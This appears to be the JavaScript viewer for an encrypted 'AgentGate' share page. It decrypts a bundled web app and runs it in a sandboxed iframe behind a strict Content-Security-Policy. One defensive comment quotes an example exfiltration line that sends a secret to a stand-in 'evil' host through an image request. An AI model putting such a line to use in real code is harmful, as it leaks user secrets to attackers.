(function () {
  "use strict";

  var MIME = {
    css: "text/css",
    js: "text/javascript",
    mjs: "text/javascript",
    json: "application/json",
    svg: "image/svg+xml",
    html: "text/html",
    txt: "text/plain",
    xml: "application/xml",
    // Binary asset types (carried as base64 in the bundle).
    png: "image/png",
    jpg: "image/jpeg",
    jpeg: "image/jpeg",
    gif: "image/gif",
    webp: "image/webp",
    ico: "image/x-icon",
    bmp: "image/bmp",
    woff: "font/woff",
    woff2: "font/woff2",
    ttf: "font/ttf",
    otf: "font/otf",
    eot: "application/vnd.ms-fontobject",
    mp3: "audio/mpeg",
    wav: "audio/wav",
    mp4: "video/mp4",
    webm: "video/webm",
    wasm: "application/wasm",
    pdf: "application/pdf",
  };

  function normalizeKey(path) {
    return (path || "")
      .replace(/^\.?\//, "")
      .replace(/^\.\//, "")
      .replace(/[?#].*$/, "");
  }

  // buildFileMap indexes files by both their full relative path and basename so
  // references like "css/app.css", "./css/app.css" and "app.css" all resolve.
  // Each value is an entry { content, encoding }; encoding is "base64" for binary
  // assets and "" (falsy) for UTF-8 text — a missing encoding means text, which
  // keeps bundles produced before base64 support rendering unchanged.
  function buildFileMap(files) {
    var map = {};
    files.forEach(function (f) {
      var name = f.title || "";
      var entry = { content: f.content || "", encoding: f.encoding || "" };
      map[normalizeKey(name)] = entry;
      var base = name.split("/").pop();
      if (base && !(normalizeKey(base) in map)) {
        map[normalizeKey(base)] = entry;
      }
    });
    return map;
  }

  function lookup(map, ref) {
    if (!ref) return null;
    if (/^(https?:|data:|blob:|mailto:|#)/i.test(ref)) return null;
    var key = normalizeKey(ref);
    if (key in map) return map[key];
    var base = key.split("/").pop();
    if (base in map) return map[base];
    return null;
  }

  function ext(name) {
    return (name || "").split(".").pop().toLowerCase();
  }

  function findEntry(map, files) {
    if ("index.html" in map) return map["index.html"].content;
    for (var i = 0; i < files.length; i++) {
      if (ext(files[i].title) === "html") return files[i].content || "";
    }
    return null;
  }

  // toDataURI turns a bundle entry into a data: URI. Base64 entries (binary
  // assets) are emitted verbatim as base64; text entries are percent-encoded.
  function toDataURI(entry, name) {
    var isBase64 = entry && entry.encoding === "base64";
    var mime = MIME[ext(name)] || (isBase64 ? "application/octet-stream" : "text/plain");
    if (isBase64) {
      return "data:" + mime + ";base64," + entry.content;
    }
    return "data:" + mime + ";charset=utf-8," + encodeURIComponent(entry.content);
  }

  // inlineCSSUrls rewrites url(...) references inside a stylesheet to data URIs
  // when the referenced asset exists in the bundle (text assets such as SVG).
  function inlineCSSUrls(css, map) {
    return css.replace(/url\(\s*(['"]?)([^'")]+)\1\s*\)/g, function (whole, q, ref) {
      var found = lookup(map, ref);
      if (found == null) return whole;
      return "url(" + toDataURI(found, ref) + ")";
    });
  }

  function assemble(files) {
    var map = buildFileMap(files);
    var entry = findEntry(map, files);
    if (entry == null) {
      return { error: "No index.html (or any .html file) found in this bundle." };
    }

    var doc = new DOMParser().parseFromString(entry, "text/html");

    // Lock the framed app to an offline, self-contained execution model. Because
    // every asset is inlined to a data: URI (see below), the app needs no network
    // at all. connect-src 'none' blocks fetch/XHR/WebSocket/sendBeacon, and
    // restricting img/font/media/style/script to inline+data: closes the remaining
    // exfiltration vectors (e.g. new Image().src = '//evil/?' + secret). This runs
    // on top of the opaque-origin iframe sandbox for defense in depth.
    var csp = doc.createElement("meta");
    csp.setAttribute("http-equiv", "Content-Security-Policy");
    csp.setAttribute(
      "content",
      "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; " +
        "img-src data: blob:; font-src data:; media-src data: blob:; " +
        "connect-src 'none'; form-action 'none'; base-uri 'none'"
    );
    var head = doc.head || doc.getElementsByTagName("head")[0];
    if (head) {
      head.insertBefore(csp, head.firstChild);
    } else {
      doc.documentElement.insertBefore(csp, doc.documentElement.firstChild);
    }

    var links = doc.querySelectorAll('link[rel~="stylesheet"][href]');
    Array.prototype.forEach.call(links, function (link) {
      var css = lookup(map, link.getAttribute("href"));
      if (css == null) return;
      var style = doc.createElement("style");
      style.textContent = inlineCSSUrls(css.content, map);
      link.parentNode.replaceChild(style, link);
    });

    var inlineStyles = doc.querySelectorAll("style");
    Array.prototype.forEach.call(inlineStyles, function (style) {
      style.textContent = inlineCSSUrls(style.textContent || "", map);
    });

    var scripts = doc.querySelectorAll("script[src]");
    Array.prototype.forEach.call(scripts, function (script) {
      var js = lookup(map, script.getAttribute("src"));
      if (js == null) return;
      var inline = doc.createElement("script");
      var type = script.getAttribute("type");
      if (type) inline.setAttribute("type", type);
      inline.textContent = js.content;
      script.parentNode.replaceChild(inline, script);
    });

    var mediaSel = "img[src], source[src], audio[src], video[src], image[href]";
    var media = doc.querySelectorAll(mediaSel);
    Array.prototype.forEach.call(media, function (el) {
      var attr = el.hasAttribute("src") ? "src" : "href";
      var found = lookup(map, el.getAttribute(attr));
      if (found == null) return;
      el.setAttribute(attr, toDataURI(found, el.getAttribute(attr)));
    });

    // Inject a tiny height reporter so the (sandboxed, opaque-origin) app can
    // tell the parent its full content height on request via postMessage. This
    // keeps the security sandbox intact — no allow-same-origin needed — and lets
    // PDF export expand the iframe to full height so printing paginates instead
    // of clipping to one page. It only responds to an explicit request message.
    var reporter = doc.createElement("script");
    reporter.textContent =
      "(function(){function h(){var d=document,e=d.documentElement,b=d.body;" +
      "return Math.max(e?e.scrollHeight:0,e?e.offsetHeight:0,b?b.scrollHeight:0,b?b.offsetHeight:0);}" +
      "window.addEventListener('message',function(ev){if(ev&&ev.data&&ev.data.__agentgate_request_height){" +
      "try{parent.postMessage({__agentgate_app_height:h()},'*');}catch(e){}}});})();";
    (doc.body || doc.documentElement).appendChild(reporter);

    var html = "<!DOCTYPE html>\n" + doc.documentElement.outerHTML;
    return { html: html };
  }

  // exportAppPdf expands the sandboxed iframe to its full reported height, prints
  // (so the PDF spans multiple pages), then restores the on-screen height. Falls
  // back to a plain print if the app does not report a height in time.
  function exportAppPdf(frame) {
    if (!frame || !frame.contentWindow) {
      window.print();
      return;
    }
    var restoreHeight = frame.style.height;
    var started = false;

    function afterPrint() {
      frame.style.height = restoreHeight;
      document.body.classList.remove("agentgate-printing-app");
      window.removeEventListener("afterprint", afterPrint);
    }

    // expandAndPrint grows the iframe to full content height so Chrome paginates
    // it, then restores on afterprint.
    function expandAndPrint(fullHeight) {
      if (started) return;
      started = true;
      window.removeEventListener("message", onMsg);
      frame.style.height = fullHeight + "px";
      document.body.classList.add("agentgate-printing-app");
      window.addEventListener("afterprint", afterPrint);
      setTimeout(function () {
        window.print();
      }, 200);
    }

    // plainPrint is the best-effort fallback when no height is reported: print
    // the page as-is without touching layout (same as before — may clip).
    function plainPrint() {
      if (started) return;
      started = true;
      window.removeEventListener("message", onMsg);
      window.print();
    }

    function onMsg(ev) {
      if (!ev || !ev.data || typeof ev.data.__agentgate_app_height !== "number") return;
      expandAndPrint(Math.max(ev.data.__agentgate_app_height, 100));
    }

    window.addEventListener("message", onMsg);
    try {
      frame.contentWindow.postMessage({ __agentgate_request_height: true }, "*");
    } catch (e) {
      plainPrint();
      return;
    }
    // Fallback: if the app never reports its height, print best-effort.
    setTimeout(plainPrint, 800);
  }

  function renderAppViewer(data, expiresAt) {
    var app = document.getElementById("app");
    if (!app) return;

    var files = data.files || [];
    var result = assemble(files);

    var viewer = document.createElement("div");
    viewer.className = "app-viewer";

    var headerEl = document.createElement("header");
    headerEl.className = "file-viewer-header";

    var headerLeft = document.createElement("div");
    headerLeft.style.display = "flex";
    headerLeft.style.alignItems = "center";
    headerLeft.style.gap = "0.75rem";

    var label = document.createElement("span");
    label.textContent = "webapp \u2014 " + files.length + " file" + (files.length !== 1 ? "s" : "");
    headerLeft.appendChild(label);

    var meta = window.AgentGateExpiry ? window.AgentGateExpiry.getShareMeta() : null;
    var badgeHandle = window.AgentGateExpiry
      ? window.AgentGateExpiry.createExpiryBadge(expiresAt, meta && meta.neverExpires)
      : null;
    if (badgeHandle) headerLeft.appendChild(badgeHandle.node);

    var headerRight = document.createElement("div");
    headerRight.style.flexShrink = "0";
    headerRight.style.display = "flex";
    headerRight.style.alignItems = "center";
    headerRight.style.gap = "0.75rem";

    if (badgeHandle && meta && window.AgentGateExpiry) {
      var toggle = window.AgentGateExpiry.createOwnerToggle(meta, badgeHandle);
      if (toggle) headerRight.appendChild(toggle);
    }
    if (window.AgentGateSettings) {
      window.AgentGateSettings.renderSettingsPanel(headerRight);
    }

    headerEl.appendChild(headerLeft);
    headerEl.appendChild(headerRight);
    viewer.appendChild(headerEl);

    if (result.error) {
      var err = document.createElement("div");
      err.className = "app-error";
      err.textContent = result.error;
      viewer.appendChild(err);
    } else {
      var frame = document.createElement("iframe");
      frame.className = "app-frame";
      // No allow-same-origin: the app runs in an opaque origin so it cannot
      // reach this decryption page or other shares. localStorage/cookies are
      // therefore unavailable to the framed app by design.
      frame.setAttribute("sandbox", "allow-scripts allow-forms allow-modals allow-popups");
      frame.setAttribute("srcdoc", result.html);
      viewer.appendChild(frame);
    }

    if (window.AgentGateExport) {
      var exportCtx = {
        kind: "app",
        title: data.title || "webapp",
        multi: false,
        sources: files.map(function (f) {
          return { name: f.title, content: f.content, encoding: f.encoding };
        }),
      };
      if (result.error) {
        // Nothing rendered to expand; fall back to a plain print.
        exportCtx.pdfLive = true;
      } else {
        // Expand the sandboxed iframe to full height, then print (paginates).
        exportCtx.pdfCustom = function () {
          exportAppPdf(frame);
        };
      }
      window.AgentGateExport.renderExportControl(headerRight, exportCtx);
    }

    app.innerHTML = "";
    app.appendChild(viewer);
  }

  function attemptDecrypt(passphrase, remember) {
    var S = window.AgentGateShare;
    var encrypted = S ? S.getEncryptedData() : null;
    if (!encrypted) return;

    var P = window.AgentGatePassphrase;
    if (P) P.showDecryptingState();

    window.AgentGateCrypto
      .decrypt(encrypted.ciphertext, encrypted.iv, encrypted.salt, passphrase)
      .then(function (plaintext) {
        var data = JSON.parse(plaintext);
        if (remember && P) P.storePassphrase(passphrase);
        if (P) P.hidePassphraseDialog();
        renderAppViewer(data, S.getExpiresAt());
      })
      .catch(function (err) {
        console.error("Decryption failed:", err);
        if (P) {
          P.updatePassphraseError("Decryption failed. Please check your passphrase.");
        }
      });
  }

  function init() {
    if (window.AgentGateSettings) {
      window.AgentGateSettings.init();
    }

    var S = window.AgentGateShare;
    var P = window.AgentGatePassphrase;
    if (!S || !P) return;

    S.load()
      .then(function (share) {
        if (!share || share.notFound || !share.encrypted) {
          S.renderNotFound();
          return;
        }
        var stored = P.getStoredPassphrase();
        if (stored) {
          P.showPassphraseDialog(attemptDecrypt, { isDecrypting: true });
          attemptDecrypt(stored, true);
        } else {
          P.showPassphraseDialog(attemptDecrypt);
        }
      })
      .catch(function (err) {
        console.error("Failed to load share:", err);
        S.renderNotFound();
      });
  }

  document.addEventListener("DOMContentLoaded", init);

  window.AgentGateApp = { assemble: assemble };
})();
